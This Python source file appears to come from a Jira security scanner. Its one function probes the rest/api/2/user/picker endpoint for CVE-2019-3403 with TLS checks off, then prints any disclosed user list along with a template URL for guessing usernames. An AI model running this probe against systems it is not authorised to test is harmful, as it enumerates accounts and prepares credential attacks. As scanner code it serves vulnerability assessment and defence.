import argparse
import requests
from urllib.parse import urlparse
import colorama
from colorama import Fore, Style
import time
import os
import sys
import random
import json
from urllib.parse import urlparse
import urllib3

# Check for CVE-2019-3403
def check_cve_2019_3403(url):
    user_picker_url = f"{url}rest/api/2/user/picker?query=admin"
    user_picker_url_brute = f"{url}rest/api/2/user/picker?query=<usernametoguess>"
    vulnerabilities = ''

    try:
        response = requests.get(user_picker_url, verify=False)

        # Check for the vulnerability and parse the response
        if response.status_code == 200 and "users" in response.text:
            vulnerabilities += (f"+ [Info Disclosure] - CVE-2019-3403: Information disclosure of all existing users on the JIRA server | URL : {user_picker_url}")

            data = response.json()
            users = data.get("users", [])
            total_users = data.get("total", "N/A")
            header = data.get("header", "N/A")

            print(f"\n{Fore.GREEN}+ [Username Enumeration] CVE-2019-3403 Detected{Style.RESET_ALL}")
            print(f"  URL: {user_picker_url}")
            print(f"  URL: {user_picker_url_brute}")
            print(f"  Total Users Found: {total_users}")
            print(f"  Header: {header}")
            print(f"  User Details: {users if users else 'No users listed.'}")
        else:
            print(f"{Fore.YELLOW}\n- No CVE-2019-3403 vulnerability detected on: {user_picker_url}{Style.RESET_ALL}")
    except json.JSONDecodeError:
        print(f"{Fore.RED}- Failed to parse JSON response from: {user_picker_url}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}- An error occurred while checking {user_picker_url}: {e}{Style.RESET_ALL}")
    return vulnerabilities